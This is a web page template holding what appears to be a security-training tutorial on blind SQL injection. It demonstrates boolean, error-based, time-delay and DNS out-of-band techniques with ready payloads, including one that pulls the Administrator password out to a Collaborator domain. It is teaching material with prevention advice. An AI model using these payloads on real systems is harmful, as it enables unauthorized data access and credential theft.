@extends('layouts.academy')

@section('title', 'What is Blind SQL Injection? Tutorial & Examples | Web Security Academy | '.config('app.name'))
@section('legacy_css', '/content/pswebsecacademy.css')

@section('academy_body')
@verbatim
<div class="wrapper-large">
    <div class="container-academy">

        <input class="nav-lhs-toggle-input" type="checkbox" id="nav-lhs-toggle">
        <aside class="nav-lhs" id="tree-nav" tree-nav-version="36">
            <nav class="nav-lhs-scrollable">
                <label class="nav-lhs-toggle-label" for="nav-lhs-toggle"></label>
                

        <a class="nav-back" href="/web-security/all-topics">
            <span class="icon-arrow-head-left"></span>
            Back to all topics
        </a>
        <input type="checkbox" id="nav-main-id">
        <label class="nav-label" for="nav-main-id">
            <span class="icon-arrow-head-down"></span>
        </label>
        <h3>SQL injection</h3>
        <ul>
            <li><a href="/web-security/sql-injection#what-is-sql-injection-sqli">What is SQL injection?</a></li>
            <li><a href="/web-security/sql-injection#what-is-the-impact-of-a-successful-sql-injection-attack">What is the impact of SQL injection?</a></li>
            <li>
                <input type="checkbox" id="sub-nav-id-3">
                <label for="sub-nav-id-3">
                    <a href="/web-security/sql-injection#how-to-detect-sql-injection-vulnerabilities">Detecting SQL injection vulnerabilities</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/sql-injection#sql-injection-in-different-parts-of-the-query">In different parts of the query</a></li>
                    <li><a href="/web-security/sql-injection#sql-injection-in-different-contexts">In different contexts</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-2">
                <label for="sub-nav-id-2">
                    <a href="/web-security/sql-injection#sql-injection-examples">Examples of SQL injection</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/sql-injection#retrieving-hidden-data">Retrieving hidden data</a></li>
                    <li><a href="/web-security/sql-injection#subverting-application-logic">Subverting application logic</a></li>
                    <li><a href="/web-security/sql-injection#retrieving-data-from-other-database-tables">Retrieving data from other tables</a></li>
                    <li><a href="/web-security/sql-injection#examining-the-database">Examining the database</a></li>
                    <li><a href="/web-security/sql-injection#blind-sql-injection-vulnerabilities">Blind SQL injection</a></li>
                    <li><a href="/web-security/sql-injection#second-order-sql-injection">Second-order SQL injection</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-7">
                <label for="sub-nav-id-7">
                    <a href="/web-security/sql-injection/examining-the-database">Examining the database</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/sql-injection/examining-the-database#querying-the-database-type-and-version">Querying the type and version</a></li>
                    <li><a href="/web-security/sql-injection/examining-the-database#listing-the-contents-of-the-database">Listing the contents</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-6">
                <label for="sub-nav-id-6">
                    <a href="/web-security/sql-injection/union-attacks">UNION attacks</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/sql-injection/union-attacks#determining-the-number-of-columns-required">Determining the number of columns</a></li>
                    <li><a href="/web-security/sql-injection/union-attacks#finding-columns-with-a-useful-data-type">Finding columns with a useful data type</a></li>
                    <li><a href="/web-security/sql-injection/union-attacks#using-a-sql-injection-union-attack-to-retrieve-interesting-data">Retrieving interesting data</a></li>
                    <li><a href="/web-security/sql-injection/union-attacks#retrieving-multiple-values-within-a-single-column">Retrieving multiple values in a single column</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-8">
                <label for="sub-nav-id-8">
                    <a href="/web-security/sql-injection/blind">Blind SQL injection</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/sql-injection/blind#what-is-blind-sql-injection">What is blind SQL injection?</a></li>
                    <li><a href="/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-responses">Triggering conditional responses</a></li>
                    <li>
                        <input type="checkbox" id="sub-nav-id-9">
                        <label for="sub-nav-id-9">
                            <a href="/web-security/sql-injection/blind#error-based-sql-injection">Error-based SQL injection</a>
                            <span class="icon-arrow-head-down"></span>
                        </label>
                        <ul>
                            <li><a href="/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-errors">Inferring information using conditional errors</a></li>
                            <li><a href="/web-security/sql-injection/blind#extracting-sensitive-data-via-verbose-sql-error-messages">Extracting data via verbose error messages</a></li>
                        </ul>
                    </li>
                    <li><a href="/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-time-delays">Triggering time delays</a></li>
                    <li><a href="/web-security/sql-injection/blind#exploiting-blind-sql-injection-using-out-of-band-oast-techniques">Out-of-band (OAST) techniques</a></li>
                    <li><a href="/web-security/sql-injection/blind#how-to-prevent-blind-sql-injection-attacks">Preventing blind SQL injection</a></li>
                </ul>
            </li>
            <li><a href="/web-security/sql-injection#how-to-prevent-sql-injection">How to prevent SQL injection</a></li>
            <li><a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a></li>
            <li><a href="/web-security/all-labs#sql-injection">View all SQL injection labs</a></li>
        </ul>
    
            </nav>
        </aside>
        <main>
            



<ul class="breadcrumb-list" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/web-security"><span itemprop="name">Web Security Academy</span></a><meta itemprop="position" content="1" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/web-security/sql-injection"><span itemprop="name">SQL injection</span></a><meta itemprop="position" content="2" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/web-security/sql-injection/blind"><span itemprop="name">Blind</span></a><meta itemprop="position" content="3" /></li></ul>    <div class="section theme-white">

        <h1 class="heading-2" id="blind-sql-injection" chunk-id="34BA93BB05D031FDA4EFD507E8AE1F5A">Blind SQL injection</h1><p>
            In this section, we describe techniques for finding and exploiting blind SQL injection vulnerabilities.
        </p><h2 id="what-is-blind-sql-injection" chunk-id="D3865990D37F9DF19463CB0B07E12C4B">What is blind SQL injection? </h2><p>
            Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
        </p><p>
            Many techniques such as <a href="/web-security/sql-injection/union-attacks"><code>UNION</code> attacks</a> are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.
        </p><h2 id="exploiting-blind-sql-injection-by-triggering-conditional-responses" chunk-id="23783E879D00890B1E6C5535CB95AFFB">Exploiting blind SQL injection by triggering conditional responses</h2><p>
            Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:
        </p><code class="code-scrollable">Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</code><p>
            When a request containing a <code>TrackingId</code> cookie is processed, the application uses a SQL query to determine whether this is a known user:
        </p><code class="code-scrollable">SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'</code><p>
            This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized <code>TrackingId</code>, the query returns data and you receive a "Welcome back" message in the response.
        </p><p>
            This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.
        </p><p id="exploiting-blind-sql-injection-by-triggering-conditional-responses-9R8N" chunk-id="DA2260E191DC33559BA455E81FD79CE5">
            To understand how this exploit works, suppose that two requests are sent containing the following <code>TrackingId</code> cookie values in turn:
        </p><code class="code-scrollable">&#8230;xyz' AND '1'='1
&#8230;xyz' AND '1'='2</code><ul>
            <li>
                The first of these values causes the query to return results, because the injected <code>AND '1'='1</code> condition is true. As a result, the "Welcome back" message is displayed.
            </li>
            <li>
                The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not
                displayed.
            </li>
        </ul><p>
            This allows us to determine the answer to any single injected condition, and extract data one piece at a time.
        </p><p id="exploiting-blind-sql-injection-by-triggering-conditional-responses-4M0U" chunk-id="019F9BE8A7525BE44F9DC8910F6B76D1">
            For example, suppose there is a table called <code>Users</code> with the columns <code>Username</code> and <code>Password</code>, and a user called <code>Administrator</code>. You can determine the password for this user by sending a series of inputs to test the password one character at a time.
        </p><p>
            To do this, start with the following input:
        </p><code class="code-scrollable">xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) &gt; 'm</code><p>
            This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than <code>m</code>.
        </p><p>
            Next, we send the following input:
        </p><code class="code-scrollable">xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) &gt; 't</code><p>
            This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than <code>t</code>.
        </p><p>
            Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is <code>s</code>:
        </p><code class="code-scrollable">xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's</code><p>
            We can continue this process to systematically determine the full password for the <code>Administrator</code> user.
        </p><div class="highlightedarea">
            <h4>Note</h4>
            <p>
                The <code>SUBSTRING</code> function is called <code>SUBSTR</code> on some types of database. For more details, see the <a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>.
            </p>
        </div>@endverbatim@include('partials.widget', ['id' => 'academy-labstatus', 'labId' => '5AEEAC77D52D55CDFF3F9A5D86D050C9A77EBFEF7657CCCB459BEE29AD5C3FCE'])@verbatim<h2 id="error-based-sql-injection" chunk-id="249E9574F0C85E7C6C64CAD08A3F6131">Error-based SQL injection</h2><p>
            Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger:
        </p><ul>
            <li>
                You may be able to induce the application to return a specific error response based on the result of a boolean expression. You can exploit this in the same way as the <a href="/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-responses">conditional responses</a> we looked at in the previous section. For more information, see <a href="/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-errors">Exploiting blind SQL injection by triggering conditional errors</a>.
            </li>
            <li>
                You may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into visible ones. For more information, see <a href="/web-security/sql-injection/blind#extracting-sensitive-data-via-verbose-sql-error-messages">Extracting sensitive data via verbose SQL error messages</a>.
            </li>
        </ul><h3 id="exploiting-blind-sql-injection-by-triggering-conditional-errors" chunk-id="2DEFA97EA11076E2306DA96A47950CE8">Exploiting blind SQL injection by triggering conditional errors</h3><p>
            Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique in the previous section won't work, because injecting different boolean conditions makes no difference to the application's responses.
        </p><p>
            
            It's often possible to induce the application to return a different response depending on whether a SQL error occurs. You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message. This enables you to infer the truth of the injected condition.
        </p><p id="exploiting-blind-sql-injection-by-triggering-conditional-errors-3H7T" chunk-id="2006822B9469BFF60D3A2868223DC5DE">
            To see how this works, suppose that two requests are sent containing the following <code>TrackingId</code> cookie values in turn:
        </p><code class="code-scrollable">xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a</code><p>
            These inputs use the <code>CASE</code> keyword to test a condition and return a different expression depending on whether the expression is true:
        </p><ul>
            <li>
                With the first input, the <code>CASE</code> expression evaluates to <code>'a'</code>, which does not cause any error.
            </li>
            <li>
                With the second input, it evaluates to <code>1/0</code>, which causes a divide-by-zero error.
            </li>
        </ul><p>
            If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.
        </p><p>
            Using this technique, you can retrieve data by testing one character at a time:
        </p><code class="code-scrollable">xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) &gt; 'm') THEN 1/0 ELSE 'a' END FROM Users)='a</code><div class="highlightedarea">
            <h4>Note</h4>
            <p>
                There are different ways of triggering conditional errors, and different techniques work best on different database types. For more details, see the <a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>.
            </p>
        </div>@endverbatim@include('partials.widget', ['id' => 'academy-labstatus', 'labId' => '9622F310CE0FC2A85821811F98F2BE7B23E049667D49D018CA28F06DC0B7875A'])@verbatim<h3 id="extracting-sensitive-data-via-verbose-sql-error-messages" chunk-id="FC5A4878F1BC9194CB6FE8123C0E71DE">Extracting sensitive data via verbose SQL error messages</h3><p>
            Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. For example, consider the following error message, which occurs after injecting a single quote into an <code>id</code> parameter:
        </p><code class="code-scrollable">Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char</code><p>
            This shows the full query that the application constructed using our input. We can see that in this case, we're injecting into a single-quoted string inside a <code>WHERE</code> statement. This makes it easier to construct a valid query containing a malicious payload. Commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax.
        </p><p id="extracting-sensitive-data-via-verbose-sql-error-messages-7G2X" chunk-id="D9F0B7A21B50B1A36CA341938849CCFC">
            Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a visible one.
        </p><p>
            You can use the <code>CAST()</code> function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:
        </p><code class="code-scrollable">CAST((SELECT example_column FROM example_table) AS int)</code><p>
            Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an <code>int</code>, may cause an error similar to the following:
        </p><code class="code-scrollable">ERROR: invalid input syntax for type integer: "Example data"</code><p>
            This type of query may also be useful if a character limit prevents you from triggering conditional responses.
        </p>@endverbatim@include('partials.widget', ['id' => 'academy-labstatus', 'labId' => '706318B8F1857A10698288C9BF7712276E4AB38822541EDEB0385A44DA54DE78'])@verbatim<h2 id="exploiting-blind-sql-injection-by-triggering-time-delays" chunk-id="31EB54DC4E421BDAB01972B588982724">Exploiting blind SQL injection by triggering time delays</h2><p>
            If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response. This means the previous technique for inducing conditional errors will not work.
        </p><p>
            In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.
        </p><p id="exploiting-blind-sql-injection-by-triggering-time-delays-5U1H" chunk-id="23386C53123EF4293C9334BD47181687">
            The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:
        </p><code class="code-scrollable">'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--</code><ul>
            <li>
                The first of these inputs does not trigger a delay, because the condition <code>1=2</code> is false.
            </li>
            <li>
                The second input triggers a delay of 10 seconds, because the condition <code>1=1</code> is true.
            </li>
        </ul><p>
            Using this technique, we can retrieve data by testing one character at a time:
        </p><code class="code-scrollable">'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) &gt; 'm') = 1 WAITFOR DELAY '0:0:{delay}'--</code><div class="highlightedarea">
            <h4>Note</h4>
            <p>
                There are various ways to trigger time delays within SQL queries, and different techniques apply on different types of database. For more details, see the <a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>.
            </p>
        </div>@endverbatim@include('partials.widget', ['id' => 'academy-labstatus', 'labId' => '5D7C0F6AE7E03B08A47F4F6BFF758A7C1B154753EFEA5DC4D4B847F7D1EAB0A7'])@verbatim@endverbatim@include('partials.widget', ['id' => 'academy-labstatus', 'labId' => '90B742428496FD275BBA4A89C5B13E2FA4DEA4BE3875EC8F6B09CDCD4CB63E7D'])@verbatim<h2 id="exploiting-blind-sql-injection-using-out-of-band-oast-techniques" chunk-id="B494E65C8B8CEE2F37DAEAB5A5EBBE4D">Exploiting blind SQL injection using out-of-band (OAST) techniques</h2><p>
            An application might carry out the same SQL query as the previous example but do it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, but none of the techniques described so far will work. The application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query.
        </p><p>
            In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.
        </p><p>
            A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). Many production networks allow free egress of DNS queries, because they're essential for the normal operation of production systems.
        </p><p id="exploiting-blind-sql-injection-using-out-of-band-oast-techniques-1P3B" chunk-id="F83981B9C36F3D584509F3D8B04EEBEE">
            The easiest and most reliable tool for using out-of-band techniques is <a href="/web-security/all-labs">Burp Collaborator</a>. This is a server that provides custom implementations of various network services, including DNS. It allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Burp Suite Professional includes a built-in client that's configured to work with Burp Collaborator right out of the box. For more information, see the documentation for
            <a href="/web-security/all-labs">Burp Collaborator</a>.
        </p><p>
            The techniques for triggering a DNS query are specific to the type of database being used. For example, the following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified domain:
        </p><code class="code-scrollable">'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--</code><p>
            This causes the database to perform a lookup for the following domain:
        </p><code class="code-scrollable">0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net</code><p>
            You can use <a href="/web-security/all-labs">Burp Collaborator</a> to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.
        </p>@endverbatim@include('partials.widget', ['id' => 'academy-labstatus', 'labId' => 'BD885D4DCA761E440E1C4056234B100F514A5BA06CB79DF59A7FDB02EDA2AF17'])@verbatim<p id="exploiting-blind-sql-injection-using-out-of-band-oast-techniques-4Y2k" chunk-id="634BDAD2FE9B6D4B6DF2B65061920FEA">
            Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:
        </p><code class="code-scrollable">'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree &quot;//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a&quot;')--</code><p>
            This input reads the password for the <code>Administrator</code> user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password:
        </p><code class="code-scrollable">S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net</code><p>
            Out-of-band (OAST) techniques are a powerful way to detect and exploit blind SQL injection, due to the high chance of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.
        </p><div class="highlightedarea">
            <h4>Note</h4>
            <p>
                There are various ways of triggering out-of-band interactions, and different techniques apply on different types of database. For more details, see the <a href="/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>.
            </p>
        </div>@endverbatim@include('partials.widget', ['id' => 'academy-labstatus', 'labId' => '365ED5E4A7DBEA87F7A659DD1349317F193BD4449F6AB6ED8062E5A319F553C6'])@verbatim<h2 id="how-to-prevent-blind-sql-injection-attacks">How to prevent blind SQL injection attacks?</h2><p>
            Although the techniques needed to find and exploit blind SQL injection vulnerabilities are different and more sophisticated than for regular SQL injection, the measures needed to prevent SQL injection are the same.
        </p><p>
            As with regular SQL injection, blind SQL injection attacks can be prevented through the careful use of parameterized queries, which ensure that user input cannot interfere with the structure of the intended SQL query.
        </p><div class="highlightedarea">
            <h4>Read more</h4>


        <ul><li><a href="/web-security/sql-injection#how-to-prevent-sql-injection">How to prevent SQL injection</a></li><li><a href="/web-security/all-labs">Find blind SQL injection vulnerabilities using Burp Suite's web vulnerability scanner</a></li></ul></div>
        
    </div>


    
    

            
        </main>
    </div>
</div>
@endverbatim
@endsection
